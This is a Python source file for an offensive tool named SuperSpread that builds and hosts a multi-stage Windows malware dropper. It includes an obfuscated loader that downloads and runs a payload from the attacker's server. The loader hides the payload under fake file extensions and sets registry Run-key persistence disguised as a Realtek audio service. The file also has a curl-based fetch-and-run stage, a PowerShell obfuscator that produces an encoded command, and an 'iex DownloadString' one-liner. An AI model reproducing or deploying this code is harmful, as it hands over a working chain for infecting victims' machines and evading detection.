import os
import random
from colorama import Fore, Back
import base64

class powfuscate:
    class utils:
        def toHex(st):
            return " ".join("{:02x}".format(ord(c)) for c in st)

        def addbuffer(st, buffer):
            result = ""
            for x in range(st.__len__()):
                if random.randint(1, 100) % 2 == 0:
                    pass
                else:
                    result += buffer
                result += st[x]
            return result

        def powEncode(st):
            return (base64.b64encode(st.encode('UTF-16LE')))

    class program:
        def main(st):
            payload = st

            stage_1 = powfuscate.utils.addbuffer(powfuscate.utils.toHex(payload).replace(" ", "*"), ".!!")
            stage_2 = ("""$_________ = ('"""+stage_1[::-1]+"""'[-1..-("""+str(stage_1.__len__())+""")]-jOIn'').replace(".!!", "").replace("*", " ");$__________ = $_________ -sPlIt ' ' |fOreAcH-obJEcT {[cHAr][bYtE]"0x$_"};$___________ = $__________ -jOIn '';$___________ | &("{2}{0}{1}"-f$sHElliD[10*0+10-7+14],'x',$env:?????m????[4])""")

            stage_3_half = powfuscate.utils.addbuffer(powfuscate.utils.addbuffer(stage_2, "┬®"), "┬Â")
            stage_3 = """iex @"
"""+stage_3_half.replace("$", "`$")+"""
"@.replace("┬Â", "").replace("┬®", "") | &("{2}{0}{1}"-f$sHElliD[10*0+10-7+14],'x',$env:?????m????[4])"""

            result = f"powershell -encodedCommand {(powfuscate.utils.powEncode(stage_3).decode())}"
            return result

    def obfuscate(st):
        return powfuscate.program.main(st)


class payloads:
    def get_setup(url):
        return """import codecs as ______________________________________________________________________________________________________________________________________
from sys import executable as ___________________________________________________
from urllib import request as _____________________________________________________
from os import getenv, system, name, listdir
from os.path import isfile as ______________________________________________________
import winreg as ___________________________________________________________________
from random import choice as _______________________________________________________
if 1==1:
    pass
_________________________________ = ______________________________________________________________________________________________________________________________________
__________________________________ = ((3**2)*(2+2+2+2+2)) + (1*2)
if 1==1:
    pass
__ = name
def ______():
    for x in range(10):
        if 99 > x and 1!=10:
            exit()
        else:
            ______()
___ = str(str('n'*2)[0:1]) + str('t'*1)
if __ != ___:
    ______()
____________________________________________________________________ = '""" + url + """'
def _________________():
    _____ = _______________________________________________________([getenv(______________________________________________________________________________________________________________________________________.encode("NCCQNGN", 'rot13')), getenv(______________________________________________________________________________________________________________________________________.encode("YBPNYNCCQNGN", 'rot13'))])
    ____ = listdir(_____)
    for _ in range(10):
        ________ = _______________________________________________________(____)
        _________ = _____ + "\\\\" + ________
        if not ______________________________________________________(_________) and " "*1 not in ________:
            return _________
    return getenv(_________________________________.encode('GRZC', 'rot13'))

def ________________():
    __ = ''.join(_______________________________________________________('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
    ___ = ['.dll', '.png', '.jpg', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
    return __ + _______________________________________________________(___)
def _______________(_):
    global ____________________________________________________________________
    with open(_, mode='w', encoding='utf-8') as ____:
        ____.write(_____________________________________________________.urlopen(____________________________________________________________________).read().decode("utf8"))
def ______________(_):
    system(f"start {___________________________________________________} {_}")
def _____________(_):
    ___ = (_________________________________.encode('.lnegflFugynrUlgvehprF', 'rot13')[::-1])+"exe"[::-1]
    ______ = f"{___________________________________________________} {_}"
    ____________ = ___________________________________________________________________.HKEY_CURRENT_USER
    _____________ = 'nuR\\\\noisreVtnerruC\\\\swodniW\\\\tfosorciM\\\\ERAWTFOS'[::-1]
    ______________ = ___________________________________________________________________.CreateKeyEx(____________, _____________, 0, ___________________________________________________________________.KEY_WRITE)
    ___________________________________________________________________.SetValueEx(______________, 'ecivreS lasrevinU oiduA DH ketlaeR'[::-1], 0, ___________________________________________________________________.REG_SZ, f"{___} & {______}")
_________ = str(chr(__________________________________))
____________ = _________________() + _________ + ________________()
_______________(____________)
______________(____________)
try:
    _____________(____________)
except:
    pass
"""

    def get_holder(url):
        rand = program.randomString(16)
        ex = program.randomExtension()
        return f"""import os
os.system("curl {url} -o {rand}{ex} && pythonw {rand}{ex}")
"""

    def get_exploit(path):
        contents = ""
        with open(path) as f:
            contents = f.read()
            f.close()
        
        return contents

    def get_obf_pws(url):
        file = program.randomString(16) + ".pyw"
        normal = f"curl {url} -o {file}; pythonw {file}"
        obf = powfuscate.obfuscate(normal)
        
        return obf

class utils:
    def write_to_file(file, value):
        f = open(file, "w")
 
        f.write(value)
        f.close()

class program:
    def ascii_art():
        return f"""{Fore.BLUE} _____                       _____                          _ 
/  ___|                     /  ___|        {Fore.YELLOW}v1.0.0.0{Fore.BLUE}        | |
\ `--. _   _ _ __   ___ _ __\ `--. _ __  _ __ ___  __ _  __| |
 `--. \ | | | '_ \ / _ \ '__|`--. \ '_ \| '__/ _ \/ _` |/ _` |
/\__/ / |_| | |_) |  __/ |  /\__/ / |_) | | |  __/ (_| | (_| |
\____/ \__,_| .__/ \___|_|  \____/| .__/|_|  \___|\__,_|\__,_|
            | |                   | |                         
            |_|                   |_|                         {Fore.RESET}
"""
    
    def randomString(l):
        result = ""
        letters = "abcdefghijklmnopqrstuvwxyz"
        
        for x in range(l):
            result += letters[random.randint(0, len(letters) - 1)]
    
        return result
    
    def randomExtension():
        extensions = [".png", ".dll", ".lnk", ".ink", ".jpg"]
        
        return random.choice(extensions)

    def main(args):
        print(program.ascii_art())

        exploit_path = "exploit_.py"
        public_addr  = ""
        private_addr = ""

        if len(args) > 1:
            try:
                epath = args[1].split("@")[1] ######
                pp = args[1].split("@")[0]
                public = pp.split('/')[1] #####
                private_end = pp.split('/')[0]
                private = "192.168." + private_end ####

                exploit_path = epath
                public_addr = public
                private_addr = private
            except:
                print(f"{Fore.RED}[-]{Fore.RESET} Args are not in a valid format!")
                exit()
        else:
            print(f"{Fore.RED}[-]{Fore.RESET} No args received!")
            exit()

        # superspread 178.175/93.15.119.51@exploit_.py
        

        current_folder = os.getcwd()

        print(f"{Fore.BLUE}[*]{Fore.RESET} Generating payloads")

        temporary_folder = program.randomString(16)
        exploit_name = program.randomString(16) + program.randomExtension()
        setup_name = program.randomString(16) + program.randomExtension()
        holder_name = program.randomString(16) + program.randomExtension()
        pws_name = program.randomString(16) + ".ps1"

        full_temporary_folder = os.path.join(current_folder, temporary_folder)
        full_exploit_name = os.path.join(os.path.join(current_folder, temporary_folder), exploit_name)
        full_setup_name   = os.path.join(os.path.join(current_folder, temporary_folder), setup_name)
        full_holder_name  = os.path.join(os.path.join(current_folder, temporary_folder), holder_name)
        full_pws_name  = os.path.join(os.path.join(current_folder, temporary_folder), pws_name)


        hosting_payload = f"sudo php -sS {private_addr}:80 -t {full_temporary_folder}"

        pws_long = payloads.get_obf_pws(f"http://{public_addr}/{holder_name}")
        
        print(f"{Fore.BLUE}[*]{Fore.RESET} Making Directory ({Fore.BLUE}{temporary_folder}/{Fore.RESET})")
        os.mkdir(full_temporary_folder)
        
        print()

        utils.write_to_file(full_exploit_name, payloads.get_exploit(exploit_path))
        utils.write_to_file(full_setup_name, payloads.get_setup(f"http://{public_addr}/{exploit_name}"))
        utils.write_to_file(full_holder_name, payloads.get_holder(f"http://{public_addr}/{setup_name}"))        
        utils.write_to_file(full_pws_name, pws_long)        

        pws_short = f"iex ((New-Object System.Net.WebClient).DownloadString('http://{public_addr}/{pws_name}'))"

        print(f"{Fore.GREEN}[+]{Fore.RESET} Powershell-Payload: {Fore.BLUE}{pws_short}{Fore.RESET}")

        print()

        print(f"{Fore.BLUE}[*]{Fore.RESET} Starting WEB-Server\n")
        os.system(hosting_payload)


import sys
if __name__ == "__main__":
    try:
        program.main(sys.argv)
    except KeyboardInterrupt:
        pass